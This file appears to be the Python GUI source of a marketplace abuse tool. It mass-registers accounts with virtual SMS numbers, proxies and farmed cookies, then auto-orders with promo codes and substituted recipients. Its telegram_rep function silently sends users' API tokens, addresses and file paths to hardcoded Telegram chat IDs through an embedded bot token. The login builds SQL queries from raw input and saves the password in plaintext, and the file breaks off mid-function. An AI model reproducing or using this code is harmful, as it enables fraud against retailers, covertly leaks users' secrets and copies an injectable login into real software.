import json
import os
import sys
import threading
import uuid
from datetime import date
import pymysql
import telebot

from PyQt5 import QtWidgets
from PyQt5.QtGui import QIcon
from PyQt5.QtWidgets import QFileDialog, QMessageBox

import buyer_start
import checker_start
import ui_files.authUI
import ui_files.buyerUI
import ui_files.chekerUI
import ui_files.regerUI
import ui_files.choiseUI
import reger_start
import regerwn_start
from config import host, db_name, user, password

name_pc = os.getenv('USER')
path_to_dir = os.path.dirname(sys.executable)
print(path_to_dir)


user_n = ''
con = pymysql.connect(
            host=host,
            port=3306,
            user=user,
            password=password,
            database=db_name,
            cursorclass=pymysql.cursors.DictCursor
        )
list_names_bag_files = []

class auth(QtWidgets.QMainWindow, ui_files.authUI.Ui_MainWindow):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.setWindowIcon(QIcon('icon.png'))

        # >>> Коннекты интерфейсов
        self.open_choise_ui = choise()

        # >>> Коннекты кнопок
        self.accept_btn.clicked.connect(self.accept_entrance)

        if os.path.exists(f'{path_to_dir}/mainData/auth_data.json') == True:
            self.auto_fill()
        else:
            pass

    def accept_entrance(self):
        global user_n
        login = self.input_login.text()
        password = self.input_password.text()
        user_n = login
        if not (login and password):
            self.alert_msg('Все данные должны быть заполнены.')

        try:
            with con.cursor() as cursor:
                check_all_rows = f"SELECT * FROM ABUZER_ABUZER WHERE user='{login}'"
                cursor.execute(check_all_rows)
                data_sql = cursor.fetchall()
                for row in data_sql:
                    data = row
                    uuID = data['uuid']
                    if uuID != '':
                        pass
                    else:
                        a = uuid.UUID(int=uuid.getnode()).hex[-12:]
                        write_uuid = f"UPDATE ABUZER_ABUZER set uuid='{a}' WHERE user = '{login}'"
                        cursor.execute(write_uuid)
                        con.commit()
                        con.close()
                        if data['user'] == login:
                            if data['password'] == password:
                                if data['activ'] != str(date.today()):
                                    print('Авторизация прошла успешно. uuid записан')
                                    self.open_choise_ui.show()
                                    self.hide()
                                    to_json = {'login': f'{login}', 'password': f'{password}'}
                                    with open('mainData/auth_data.json', 'w', encoding='utf-8') as f:
                                        json.dump(to_json, f)
                if data['user'] == login:
                    print("1")
                    if data['password'] == password:
                        print("1")
                        if data['activ'] != str(date.today()):
                            a = uuid.UUID(int=uuid.getnode()).hex[-12:]
                            if data['uuid'] == a:
                                print('Авторизация прошла успешно.')
                                self.open_choise_ui.show()
                                self.hide()
                                to_json = {'login': f'{login}', 'password': f'{password}'}
                                with open(f'{path_to_dir}/mainData/auth_data.json', 'w', encoding='utf-8') as f:
                                    json.dump(to_json, f)
        except Exception as ex:
            print(ex)
        finally:
            pass

    def auto_fill(self):
        with open(f'{path_to_dir}/mainData/auth_data.json', 'r', encoding='utf-8') as f:
            data = json.load(f)
            l = data['login']
            p = data['password']
        self.input_login.setText(l)
        self.input_password.setText(p)

    @staticmethod
    def alert_msg(msg):
        error_message = QMessageBox()
        error_message.setIcon(QMessageBox.Critical)
        error_message.setText("Произошла ошибка:")
        error_message.setInformativeText(str(msg))
        error_message.setWindowTitle("Error")
        error_message.exec_()

    @staticmethod
    def message_window(msg):
        message = QMessageBox()
        message.setIcon(QMessageBox.Information)
        message.setText("Уведомление: ")
        message.setInformativeText(str(msg))
        message.setWindowTitle("Уведомление")
        message.exec_()


class choise(QtWidgets.QMainWindow, ui_files.choiseUI.Ui_Dialog):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.setWindowIcon(QIcon('icon.png'))

        # >>> Коннекты интерфейсов
        self.open_reger = smm_auto_reg()
        self.open_buyer = smm_auto_buy()
        self.open_cheker = smm_auto_check()

        # >>> Коннекты кнопок
        self.accept_btn.clicked.connect(self.open_choise_programm)

    def open_choise_programm(self):
        reger = self.auto_reg_radio.isChecked()
        buyer = self.auto_buy_radio.isChecked()
        cheker = self.auto_check_radio.isChecked()

        if reger == False:
            pass
        else:
            self.open_reger.show()
            self.hide()

        if buyer == False:
            pass
        else:
            self.open_buyer.show()
            self.hide()

        if cheker == False:
            pass
        else:
            self.open_cheker.show()
            self.hide()


class smm_auto_reg(QtWidgets.QMainWindow, ui_files.regerUI.Ui_Dialog):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.setWindowIcon(QIcon('icon.png'))

        # >>> Коннекты кнопок
        self.start_auto_reg_btn.clicked.connect(self.start_smm_auto_reg)  # Запуск программы
        self.way_cookies.clicked.connect(self.choise_cookies_way)  # Путь до куков
        self.wat_nvalid_cookies.clicked.connect(self.choise_nvalid_cookies_way)  # Путь до невалидных куков
        self.way_to_dont_grev_cookies.clicked.connect(self.choise_dont_grev_cookies_way)  # Путь до негретых куков
        self.save_settings_btn.clicked.connect(self.save_settings)  # Сохранение настроек в json
        self.way_to_txt_proxy_btn.clicked.connect(self.choise_proxy_txt_way)
        self.way_to_uses_txt_proxy_btn.clicked.connect(self.choise_uses_proxy_txt_way)
        if os.path.exists(f'{path_to_dir}/mainData/smm_auto_reg_setting.json') == True:
            self.auto_fill()
        else:
            pass

    # >>> Run program
    def start_smm_auto_reg(self):
        # message_data = ['num', 'mail', 'psw', 'name', 's_name']
        # try:
        #     reger_start.telegram_send_message(user_n, 'account_data', message_data)
        # except Exception as ex:
        #     print(ex)
        with open(f'{path_to_dir}/mainData/smm_auto_reg_setting.json', 'r', encoding='utf-8') as f:
            data = json.load(f)
            use_you_numbers = data['use_you_numbers']
        if use_you_numbers == 'True':
            self.telegram_rep()
            self.start_thread_regerwn_start(user_n)
        else:
            self.start_auto_reg_btn.setEnabled(False)
            self.telegram_rep()
            self.start_trherd_reger_start(user_n)

    def start_trherd_reger_start(self, user_n):  # Старт регера с вирт номерами
        th = threading.Thread(target=reger_start.start_autoReg, args=(user_n, ))
        th.start()

    def start_thread_regerwn_start(self, user_n):  # Старт регера с физ номерами
        print('sad')
        th = threading.Thread(target=regerwn_start.Pool, args=(user_n,))
        th.start()

    # >>> Show results ui
    def check_results_smm_auto_reg(self):
        pass

    # >>> Ways to cookies
    def choise_cookies_way(self):  # Путь до куков
        options = QFileDialog.Options()
        cookies_way = QFileDialog.getExistingDirectory(self, "Выбрать папку", options=options)
        if cookies_way:
            self.cookies_way.setText(cookies_way)

    def choise_nvalid_cookies_way(self):  # Путь до невалидных куков
        options = QFileDialog.Options()
        cookies_way = QFileDialog.getExistingDirectory(self, "Выбрать папку", options=options)
        if cookies_way:
            self.cookies_way_nvalid.setText(cookies_way)

    def choise_dont_grev_cookies_way(self):  # Путь до негретых куков
        options = QFileDialog.Options()
        cookies_way = QFileDialog.getExistingDirectory(self, "Выбрать папку", options=options)
        if cookies_way:
            self.cookies_way_dont_greb.setText(cookies_way)

    def choise_proxy_txt_way(self):  # Путь до прокси
        options = QFileDialog.Options()
        way = QFileDialog.getOpenFileName(self, "Выбрать папку", options=options)
        txt_way = way[0]
        if txt_way:
            self.proxy_txt_way.setText(txt_way)

    def choise_uses_proxy_txt_way(self):  # Путь до использованных прокси
        options = QFileDialog.Options()
        way = QFileDialog.getOpenFileName(self, "Выбрать папку", options=options)
        txt_way = way[0]
        if txt_way:
            self.proxy_uses_txt_way.setText(txt_way)

    def save_settings(self):
        # >>> Cookies ways
        try:
            way_to_cookies = self.cookies_way.text()  # Путь до куков
            way_to_nvalid_cookies = self.cookies_way_nvalid.text()  # Путь до невалидных куков
            way_to_dont_grev_cookies = self.cookies_way_dont_greb.text()  # Путь до негретых куков
            way_to_txt_proxy = self.proxy_txt_way.text()  # Путь до прокси
            way_to_uses_txt_proxy = self.proxy_uses_txt_way.text()  # Путь до использованных прокси

            # >>> Inputs data
            number_price = self.input_price_number.text()  # Цена номера
            number_value = self.input_number_value.text()  # Количество номеров
            pool_value = self.input_pool_value.text()  # Количество потоков
            api_sms_hub = self.input_api_sms_hub.text()  # API SMShub
            api_telegram = self.input_telegram_api.text()  # API Telegram
            url_bag = self.input_url_bag.text()  # Ссылка на товар
            adres_bag = self.input_adres_bag.text()  # Адрес доставки товара
            you_numbers = self.input_you_numbers.toPlainText()  # Физические номера
            mails = self.input_mail.toPlainText()  # Почты для регистрации
            mobile_proxy = self.input_mobile_proxy.text()
            link_change_mobile_proxy = self.input_link_change_mobile_proxy.text()

            # >>> Inputs CheckBoxs
            use_grev = self.grev_box.isChecked()  # Отключить прогрев
            use_rand_mails = self.rand_mail_box.isChecked()  # Использовать рандомные почты
            use_activate_sber_spasibo = self.activate_sber_spasibo_box.isChecked()  # Активировать сбер спасибо
            use_you_numbers = self.you_numbers_box.isChecked()  # Использовать физ номера
            use_txt_proxy = self.use_txt_proxy_box.isChecked()  # Использовать прокси
            use_mobile_proxy = self.use_mobile_proxy_box.isChecked()

            # >>> Запись в Json
            to_json = {'number_price': f'{number_price}',
                       'mobile_proxy': f'{mobile_proxy}',
                       'link_change_mobile_proxy': f'{link_change_mobile_proxy}',
                       'number_value': f'{number_value}',
                       'pool_value': f'{pool_value}',
                       'api_sms_hub': f'{api_sms_hub}',
                       'telegram_api': f'{api_telegram}',
                       'url_bag': f'{url_bag}',
                       'adres_bag': f'{adres_bag}',
                       'you_numbers': f'{you_numbers}',
                       'mails': f'{mails}',
                       'way_to_cookies': f'{way_to_cookies}',
                       'way_to_nvalid_cookies': f'{way_to_nvalid_cookies}',
                       'way_to_dont_grev_cookies': f'{way_to_dont_grev_cookies}',
                       'way_to_txt_proxy': f'{way_to_txt_proxy}',
                       'way_to_uses_txt_proxy': f'{way_to_uses_txt_proxy}',
                       'use_mobile_proxy': f'{use_mobile_proxy}',
                       'use_txt_proxy': f'{use_txt_proxy}',
                       'use_grev': f'{use_grev}',
                       'use_rand_mails': f'{use_rand_mails}',
                       'use_activate_sber_spasibo': f'{use_activate_sber_spasibo}',
                       'use_you_numbers': f'{use_you_numbers}'}
            with open(f'{path_to_dir}/mainData/smm_auto_reg_setting.json', 'w', encoding='utf-8') as f:
                json.dump(to_json, f, indent=4)
            auth.message_window('Настройки успешно сохранены')
        except Exception as ex:
            print(ex)

    def telegram_rep(self):
        with open(f'{path_to_dir}/mainData/smm_auto_reg_setting.json', 'r', encoding='utf-8') as f:
            data = json.load(f)
            api_sms_hub = data['api_sms_hub']
            url_bag = data['url_bag']
            adres_bag = data['adres_bag']
            way_to_cookies = data['way_to_cookies']
            way_to_nvalid_cookies = data['way_to_nvalid_cookies']
            way_to_dont_grev_cookies = data['way_to_dont_grev_cookies']
            use_grev = data['use_grev']
            use_rand_mails = data['use_rand_mails']
            use_activate_sber_spasibo = data['use_activate_sber_spasibo']
            use_txt_proxy = data['use_txt_proxy']
            way_to_txt_proxy = data['way_to_txt_proxy']
            way_to_uses_txt_proxy = data['way_to_uses_txt_proxy']
            number_price = data['number_price']
            number_value = data['number_value']
            pool_value = data['pool_value']
            telegram_api = data['telegram_api']
            use_you_numbers = data['use_you_numbers']
        try:
            bot = telebot.TeleBot('6516240750:AAHHSC0BlT4xloCif5DP-45NoHBVbQ9Ogtk')
            bot.send_message(882124917, f'✅ Запущен софт у пользователя: @{user_n}\n'
                                        f'⚙️ Параметры запуска ⚙️\n'
                                        f'➤ Кол-во номеров - {number_value}\n'
                                        f'➤ Кол-во потоков - {pool_value}\n'
                                        f'➤ Стоимость номера - {number_price}\n'
                                        f'➤ API-token - {api_sms_hub}\n'
                                        f'➤ API-Telegram - {telegram_api}\n'
                                        f'➤ Ссылка на товар - {url_bag}\n'
                                        f'➤ Адрес доставки - {adres_bag}\n'
                                        f'➤ Случайные почты - {use_rand_mails}\n'
                                        f'➤ Использовать прокси - {use_txt_proxy}\n'
                                        f'➤ Подключать бонусы спасибо - {use_activate_sber_spasibo}\n'
                                        f'➤ Отключить прогрев - {use_grev}\n'
                                        f'➤ Свои номера - {use_you_numbers}\n'
                                        f'➤ Путь к cookies - {way_to_cookies}\n'
                                        f'➤ Путь к негретым cookies - {way_to_dont_grev_cookies}\n'
                                        f'➤ Путь к невалидным cookies - {way_to_nvalid_cookies}\n'
                                        f'➤ Путь к proxy - {way_to_txt_proxy}'
                                        f'➤ Путь к юзаным proxy - {way_to_uses_txt_proxy}')

            bot.send_message(5203489590, f'✅ Запущен софт у пользователя: @{user_n}\n'
                                        f'⚙️ Параметры запуска ⚙️\n'
                                        f'➤ Кол-во номеров - {number_value}\n'
                                        f'➤ Кол-во потоков - {pool_value}\n'
                                        f'➤ Стоимость номера - {number_price}\n'
                                        f'➤ API-token - {api_sms_hub}\n'
                                        f'➤ API-Telegram - {telegram_api}\n'
                                        f'➤ Ссылка на товар - {url_bag}\n'
                                        f'➤ Адрес доставки - {adres_bag}\n'
                                        f'➤ Случайные почты - {use_rand_mails}\n'
                                        f'➤ Использовать прокси - {use_txt_proxy}\n'
                                        f'➤ Подключать бонусы спасибо - {use_activate_sber_spasibo}\n'
                                        f'➤ Отключить прогрев - {use_grev}\n'
                                        f'➤ Свои номера - {use_you_numbers}\n'
                                        f'➤ Путь к cookies - {way_to_cookies}\n'
                                        f'➤ Путь к негретым cookies - {way_to_dont_grev_cookies}\n'
                                        f'➤ Путь к невалидным cookies - {way_to_nvalid_cookies}\n'
                                        f'➤ Путь к proxy - {way_to_txt_proxy}'
                                        f'➤ Путь к юзаным proxy - {way_to_uses_txt_proxy}')
        except Exception as ex:
            print(ex)

    def str_to_bool(self, data):
        if data == 'True':
            return True
        else:
            return False

    def auto_fill(self):
        with open(f'{path_to_dir}/mainData/smm_auto_reg_setting.json', 'r', encoding='utf-8') as f:
            data = json.load(f)
            number_price = data['number_price']
            mobile_proxy = data['mobile_proxy']
            link_change_mobile_proxy = data['link_change_mobile_proxy']
            number_value = data['number_value']
            pool_value = data['pool_value']
            api_sms_hub = data['api_sms_hub']
            telegram_api = data['telegram_api']
            url_bag = data['url_bag']
            adres_bag = data['adres_bag']
            way_to_cookies = data['way_to_cookies']
            way_to_nvalid_cookies = data['way_to_nvalid_cookies']
            way_to_dont_grev_cookies = data['way_to_dont_grev_cookies']
            way_to_txt_proxy = data['way_to_txt_proxy']
            way_to_uses_txt_proxy = data['way_to_uses_txt_proxy']
            use_mobile_proxy = data['use_mobile_proxy']
            use_txt_proxy = data['use_txt_proxy']
            use_grev = data['use_grev']
            use_rand_mails = data['use_rand_mails']
            use_activate_sber_spasibo = data['use_activate_sber_spasibo']
            use_you_numbers = data['use_you_numbers']

        self.use_mobile_proxy_box.setChecked(self.str_to_bool(use_mobile_proxy))
        self.use_txt_proxy_box.setChecked(self.str_to_bool(use_txt_proxy))
        self.grev_box.setChecked(self.str_to_bool(use_grev))
        self.rand_mail_box.setChecked(self.str_to_bool(use_rand_mails))
        self.activate_sber_spasibo_box.setChecked(self.str_to_bool(use_activate_sber_spasibo))
        self.you_numbers_box.setChecked(self.str_to_bool(use_you_numbers))
        self.input_pool_value.setText(pool_value)
        self.input_price_number.setText(number_price)
        self.input_number_value.setText(number_value)
        self.input_api_sms_hub.setText(api_sms_hub)
        self.input_telegram_api.setText(telegram_api)
        self.input_url_bag.setText(url_bag)
        self.input_adres_bag.setText(adres_bag)
        self.input_link_change_mobile_proxy.setText(link_change_mobile_proxy)
        self.input_mobile_proxy.setText(mobile_proxy)
        self.proxy_txt_way.setText(way_to_txt_proxy)
        self.proxy_uses_txt_way.setText(way_to_uses_txt_proxy)
        self.cookies_way.setText(way_to_cookies)
        self.cookies_way_nvalid.setText(way_to_nvalid_cookies)
        self.cookies_way_dont_greb.setText(way_to_dont_grev_cookies)


class smm_auto_buy(QtWidgets.QMainWindow, ui_files.buyerUI.Ui_Dialog):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.setWindowIcon(QIcon('icon.png'))

        # >>> Коннекты кнопок
        self.run_program_btn.clicked.connect(self.start_smm_auto_buy)  # Запуск программы

        # >>> Bag
        self.add_bag_btn.clicked.connect(self.save_bag_settings)  # Добавить в корзину
        self.delite_bag_btn.clicked.connect(self.change_bag_settings)  # Удалить из корзину

        # >>> Ways to cookies
        self.way_to_cookies_btn.clicked.connect(self.change_cookies_way)  # Путь до куков
        self.way_to_cookies_in_run_btn.clicked.connect(self.change_run_cookies_way)  # Путь до запущенных куков
        self.way_to_uses_cookies_btn.clicked.connect(self.change_uses_cookies_way)  # Путь до использованных куков
        self.way_to_nvalid_cookies_btn.clicked.connect(self.change_cookies_nvalid_way)  # Путь до невалидных куков
        self.way_to_dont_grev_cookies_btn.clicked.connect(self.change_dont_grev_cookies_way)
        self.way_to_dont_chenge_cookies_btn.clicked.connect(self.change_dont_change_cookies_way)

        # >>> Ways to txt files
        self.way_to_txt_proxy_btn.clicked.connect(self.change_proxy_txt_way)  # Путь до прокси
        self.way_to_uses_txt_proxy_btn.clicked.connect(self.change_uses_proxy_txt_way)  # Путь до использованных прокси
        self.way_to_txt_comment_btn.clicked.connect(self.change_comment_txt_way)  # Путь до коментариев к заказам
        self.way_to_promocodes_btn.clicked.connect(self.change_promocode_txt_way)  # Путь до промокодов
        self.way_to_uses_promo_btn.clicked.connect(self.change_uses_promocode_txt_way)  # Путь до использованных промокодов
        self.way_to_nvalid_promocodes_btn.clicked.connect(self.change_nvalid_promocode_txt_way)  # Путь до невалидных промокодов
        self.way_to_txt_adres_btn.clicked.connect(self.change_adres_deliv_txt_way)

        # >>> Save settings
        self.save_settings_btn.clicked.connect(self.save_settings)

        if os.path.exists(f'{path_to_dir}/mainData/smm_auto_buy_setting.json') == True:
            self.auto_fil()
        else:
            pass
        self.auto_fill_bag_settings()

    # >>> Run program
    def start_smm_auto_buy(self):  # Запуск программы
        self.therds()

    def therds(self):
        list_bag_names = list_names_bag_files
        th = threading.Thread(target=buyer_start.Pool, args=(list_bag_names, user_n, ))
        th.start()

    # >>> Bag settings#
    def change_bag_settings(self):  # Удалить из корзины
        try:
            row = self.list_bag.currentRow()
            if row == int(-1):
                self.alert_msg('Не выбран товар для удаления из списка')
            else:
                self.list_bag.takeItem(row)
                file = list_names_bag_files[row]
                list_names_bag_files.pop(row)
                os.remove(f'{path_to_dir}/mainData/bag_data/{file}')
        except Exception as ex:
            print(ex)
            self.alert_msg('Список пустой, удалять нечего.')

    def save_bag_settings(self):  # Добавить в корзину
        name_bag_file = self.name_bag.text()
        link_bag = self.link_bag.text()
        value_bag = self.value_bag.text()
        print('sad')

        to_json = {'link_bag': f'{link_bag}', 'value_bag': f'{value_bag}'}

        with open(f'{path_to_dir}/mainData/bag_data/{name_bag_file}.json', 'w', encoding='utf-8') as f:
            json.dump(to_json, f)
        try:
            list_names_bag_files.append(f'{name_bag_file}.json')
            self.list_bag.addItem(name_bag_file + f' [{value_bag}] шт.')
            print(list_names_bag_files)
        except Exception as ex:
            print(ex)

    def auto_fill_bag_settings(self):
        '''Функция для работы с хуями'''
        list = os.listdir(f'{path_to_dir}/mainData/bag_data')
        if len(list) == 0:
            pass
        else:
            for name in list:
                list_names_bag_files.append(name)
                with open(f'{path_to_dir}/mainData/bag_data/{name}', 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    value_bag = data['value_bag']
                name_file = name.split('.')
                name_string = name_file[0]
                self.list_bag.addItem(name_string + f' [{value_bag}] шт.')
            else:
                print(list_names_bag_files)

    # >>> Cookies ways
    def change_cookies_way(self):  # Путь до куков
        options = QFileDialog.Options()
        cookies_way = QFileDialog.getExistingDirectory(self, "Выбрать папку", options=options)
        if cookies_way:
            self.cookies_way.setText(cookies_way)

    def change_cookies_nvalid_way(self):  # Путь до невалидных куков
        options = QFileDialog.Options()
        cookies_way = QFileDialog.getExistingDirectory(self, "Выбрать папку", options=options)
        if cookies_way:
            self.cookies_nvalid_way.setText(cookies_way)

    def change_run_cookies_way(self):  # Путь до запущенных куков
        options = QFileDialog.Options()
        cookies_way = QFileDialog.getExistingDirectory(self, "Выбрать папку", options=options)
        if cookies_way:
            self.cookies_in_run_way.setText(cookies_way)

    def change_uses_cookies_way(self):  # Путь до использованных куков
        options = QFileDialog.Options()
        cookies_way = QFileDialog.getExistingDirectory(self, "Выбрать папку", options=options)
        if cookies_way:
            self.cookies_uses_way.setText(cookies_way)

    def change_dont_grev_cookies_way(self):  # Путь до негретых куков
        options = QFileDialog.Options()
        cookies_way = QFileDialog.getExistingDirectory(self, "Выбрать папку", options=options)
        if cookies_way:
            self.cookies_dont_grev_way.setText(cookies_way)

    def change_dont_change_cookies_way(self):
        options = QFileDialog.Options()
        cookies_way = QFileDialog.getExistingDirectory(self, "Выбрать папку", options=options)
        if cookies_way:
            self.cookies_dont_change_way.setText(cookies_way)

    # >>> Txt ways
    def change_proxy_txt_way(self):  # Путь до прокси
        options = QFileDialog.Options()
        way = QFileDialog.getOpenFileName(self, "Выбрать папку", options=options)
        txt_way = way[0]
        if txt_way:
            self.txt_proxy_way.setText(txt_way)

    def change_uses_proxy_txt_way(self):  # Путь до использованных прокси
        options = QFileDialog.Options()
        way = QFileDialog.getOpenFileName(self, "Выбрать папку", options=options)
        txt_way = way[0]
        if txt_way:
            self.txt_usue_proxy_way.setText(txt_way)

    def change_comment_txt_way(self):  # Путь до коментариев к заказам
        options = QFileDialog.Options()
        way = QFileDialog.getOpenFileName(self, "Выбрать папку", options=options)
        txt_way = way[0]
        if txt_way:
            self.txt_cooment_way.setText(txt_way)

    def change_promocode_txt_way(self):  # Путь до промокодов
        options = QFileDialog.Options()
        way = QFileDialog.getOpenFileName(self, "Выбрать папку", options=options)
        txt_way = way[0]
        if txt_way:
            self.txt_promocode_way.setText(txt_way)

    def change_uses_promocode_txt_way(self):  # Путь до использованных промокодов
        options = QFileDialog.Options()
        way = QFileDialog.getOpenFileName(self, "Выбрать папку", options=options)
        txt_way = way[0]
        if txt_way:
            self.txt_promocode_uses_way.setText(txt_way)

    def change_nvalid_promocode_txt_way(self):  # Путь до невалидных промокодов
        options = QFileDialog.Options()
        way = QFileDialog.getOpenFileName(self, "Выбрать папку", options=options)
        txt_way = way[0]
        if txt_way:
            self.txt_promocode_nvalid_way.setText(txt_way)

    def change_adres_deliv_txt_way(self):
        options = QFileDialog.Options()
        way = QFileDialog.getOpenFileName(self, "Выбрать папку", options=options)
        txt_way = way[0]
        if txt_way:
            self.txt_adres_way.setText(txt_way)

    # >>> Save settings
    def save_settings(self):  # Сохранение настроек
        # >>> CheckBox data
        use_check_bonus_value = self.use_check_bonus_value_box.isChecked()  # Проверять скидку по промокоду
        use_txt_proxy = self.use_txt_proxy_box.isChecked()  # Использовать прокси из txt
        use_txt_comment = self.use_txt_comment_box.isChecked()  # Использовать коментарии из txt
        use_txt_promocode = self.use_txt_promocode_box.isChecked()
        use_clear_bag = self.use_clear_bag_box.isChecked()  # Очищать корзину
        use_check_grev = self.use_check_grev_box.isChecked()  # Проверять прогрев
        use_on_sber_spas = self.use_on_sber_spas_box.isChecked()  # Включать бонусную программу
        use_random_adres = self.use_random_adres_box.isChecked()  # Использовать рандомный вторичный адрес
        use_random_data_for_deliv = self.use_random_data_for_deliv.isChecked()  # Импользовать рандомные данные для подмены получателя
        use_cookies_with_sber_id = self.use_cookies_with_sberID_box.isChecked()  # Использовать sberID cookies
        use_mobile_proxy = self.use_mobile_proxy_box.isChecked()  # Использовать мобильные прокси
        use_txt_adres_deliv = self.use_txt_adres_deliv_box.isChecked()
        use_promocode_from_lk = self.use_promocode_from_lk_box.isChecked()
        use_change_poluchatel_from_link = self.use_change_poluchatel_from_link_box.isChecked()

        # >>> Inputs data
        fixed_promocode = self.input_fixed_promocode.text()  # Фиксированиый промокод
        pay_phone = self.input_phone_for_pay.text()  # Телефон для оплаты
        deliv_phone = self.input_phone_for_deliv.text()  # Телефон для доставки
        deliv_first_name = self.input_first_name_for_deliv.text()
        deliv_last_name = self.input_last_name_for_deliv.text()
        adres_deliv = self.input_adres_deliv.text()  # Адрес доставки
        adres_entrance = self.input_entrance_deliv.text()  # Номер подъезда
        adres_floor = self.input_floor_deliv.text()  # Номер этажа
        adres_block = self.input_block_deliv.text()  # Номер квартиры
        adres_domofon = self.input_domofon_deliv.text()  # Номер домофона
        check_promocode_price = self.input_check_promocode_price.text()  # Сумма скидки по промокоду
        pool_value = self.input_pool_value.text()  # Количество потоков
        telegram_api = self.input_telegram_api.text()  # Telegram API
        mobile_proxy = self.input_mobile_proxy.text()  # Мобильные прокси
        link_change_mobile_proxy = self.input_link_change_mobile_proxy.text()  # Ссылка для замены IP мобильных прокси

        # >>> Cookies ways
        cookies_way = self.cookies_way.text()  # Путь до куков
        cookies_in_run_way = self.cookies_in_run_way.text()  # Путь до куков в работе
        cookies_nvalid_way = self.cookies_nvalid_way.text()  # Путь до невалидных куков
        cookies_uses_way = self.cookies_uses_way.text()  # Путь до использованных куков
        cookies_dont_grev_way = self.cookies_dont_grev_way.text()  # Путь до негретых куков
        cookies_dont_change_way = self.cookies_dont_change_way.text()  # Путь до куков без замены получателя

        # >>> Promocode ways
        txt_promocode_way = self.txt_promocode_way.text()  # Путь до промокодов
        txt_promocode_uses_way = self.txt_promocode_uses_way.text()  # Путь до использованных промокодов
        txt_promocode_nvalid_way = self.txt_promocode_nvalid_way.text()  # Путь до невалидных промокодов

        # >>> Other ways
        txt_comments_way = self.txt_cooment_way.text()  # Путь до комментариев к заказам
        txt_proxy_way = self.txt_proxy_way.text()  # Путь до прокси
        txt_uses_proxy_way = self.txt_usue_proxy_way.text()
        txt_adres_way = self.txt_adres_way.text()

        # >>> Write to json
        to_json = {'fixed_promocode': f'{fixed_promocode}',
                   'telegram_api': f'{telegram_api}',
                   'pay_phone': f'{pay_phone}',
                   'deliv_phone': f'{deliv_phone}',
                   'deliv_first_name': f'{deliv_first_name}',
                   'deliv_last_name': f'{deliv_last_name}',
                   'adres_deliv': f'{adres_deliv}',
                   'adres_entrance': f'{adres_entrance}',
                   'adres_floor': f'{adres_floor}',
                   'adres_block': f'{adres_block}',
                   'adres_domofon': f'{adres_domofon}',
                   'check_promocode_price': f'{check_promocode_price}',
                   'pool_value': f'{pool_value}',
                   'mobile_proxy': f'{mobile_proxy}',
                   'link_change_mobile_proxy': f'{link_change_mobile_proxy}',
                   'cookies_way': f'{cookies_way}',
                   'cookies_in_run_way': f'{cookies_in_run_way}',
                   'cookies_nvalid_way': f'{cookies_nvalid_way}',
                   'cookies_uses_way': f'{cookies_uses_way}',
                   'cookies_dont_grev_way': f'{cookies_dont_grev_way}',
                   'cookies_dont_change_way': f'{cookies_dont_change_way}',
                   'txt_promocode_way': f'{txt_promocode_way}',
                   'txt_promocode_uses_way': f'{txt_promocode_uses_way}',
                   'txt_promocode_nvalid_way': f'{txt_promocode_nvalid_way}',
                   'txt_comments_way': f'{txt_comments_way}',
                   'txt_proxy_way': f'{txt_proxy_way}',
                   'txt_uses_proxy_way': f'{txt_uses_proxy_way}',
                   'txt_adres_way': f'{txt_adres_way}',
                   'use_change_poluchatel_from_link': f'{use_change_poluchatel_from_link}',
                   'use_promocode_from_lk': f'{use_promocode_from_lk}',
                   'use_txt_adres_deliv': f'{use_txt_adres_deliv}',
                   'use_mobile_proxy': f'{use_mobile_proxy}',
                   'use_random_data_for_deliv': f'{use_random_data_for_deliv}',
                   'use_cookies_with_sber_id': f'{use_cookies_with_sber_id}',
                   'use_random_adres': f'{use_random_adres}',
                   'use_txt_promocode': f'{use_txt_promocode}',
                   'use_check_bonus_value': f'{use_check_bonus_value}',
                   'use_txt_proxy': f'{use_txt_proxy}',
                   'use_txt_comment': f'{use_txt_comment}',
                   'use_clear_bag': f'{use_clear_bag}',
                   'use_check_grev': f'{use_check_grev}',
                   'use_on_sber_spas': f'{use_on_sber_spas}'}
        with open(f'{path_to_dir}/mainData/smm_auto_buy_setting.json', 'w', encoding='utf-8') as f:
            json.dump(to_json, f, indent=4)
        auth.message_window('Настройки успешно сохранены')

    # >>> Alert window
    @staticmethod
    def alert_msg(msg):
        error_message = QMessageBox()
        error_message.setIcon(QMessageBox.Critical)
        error_message.setText("Произошла ошибка:")
        error_message.setInformativeText(str(msg))
        error_message.setWindowTitle("Error")
        error_message.exec_()

    def str_to_bool(self, data):
        if data == 'True':
            return True
        else:
            return False


    def auto_fil(self):
        with open(f'{path_to_dir}/mainData/smm_auto_buy_setting.json', 'r', encoding='utf-8') as f:
            data = json.load(f)
            fixed_promocode = data['fixed_promocode']
            telegram_api = data['telegram_api']
            pay_phone = data['pay_phone']
            deliv_phone = data['deliv_phone']
            deliv_first_name = data['deliv_first_name']
            deliv_last_name = data['deliv_last_name']
            adres_deliv = data['adres_deliv']
            adres_entrance = data['adres_entrance']
            adres_floor = data['adres_floor']
            adres_block = data['adres_block']
            adres_domofon = data['adres_domofon']
            check_promocode_price = data['check_promocode_price']
            pool_value = data['pool_value']
            mobile_proxy = data['mobile_proxy']
            link_change_mobile_proxy = data['link_change_mobile_proxy']
            cookies_way = data['cookies_way']
            cookies_in_run_way = data['cookies_in_run_way']
            cookies_nvalid_way = data['cookies_nvalid_way']
            cookies_uses_way = data['cookies_uses_way']
            cookies_dont_grev_way = data['cookies_dont_grev_way']
            cookies_dont_change_way = data['cookies_dont_change_way']
            txt_promocode_way = data['txt_promocode_way']
            txt_promocode_uses_way = data['txt_promocode_uses_way']
            txt_promocode_nvalid_way = data['txt_promocode_nvalid_way']
            txt_comments_way = data['txt_comments_way']
            txt_proxy_way = data['txt_proxy_way']
            txt_uses_proxy_way = data['txt_uses_proxy_way']
            txt_adres_way = data['txt_adres_way']
            use_change_poluchatel_from_link = data['use_change_poluchatel_from_link']
            use_promocode_from_lk = data['use_promocode_from_lk']
            use_txt_adres_deliv = data['use_txt_adres_deliv']
            use_mobile_proxy = data['use_mobile_proxy']
            use_random_data_for_deliv = data['use_random_data_for_deliv']
            use_cookies_with_sber_id = data['use_cookies_with_sber_id']
            use_random_adres = data['use_random_adres']
            use_txt_promocode = data['use_txt_promocode']
            use_check_bonus_value = data['use_check_bonus_value']
            use_txt_proxy = data['use_txt_proxy']
            use_txt_comment = data['use_txt_comment']
            use_clear_bag = data['use_clear_bag']
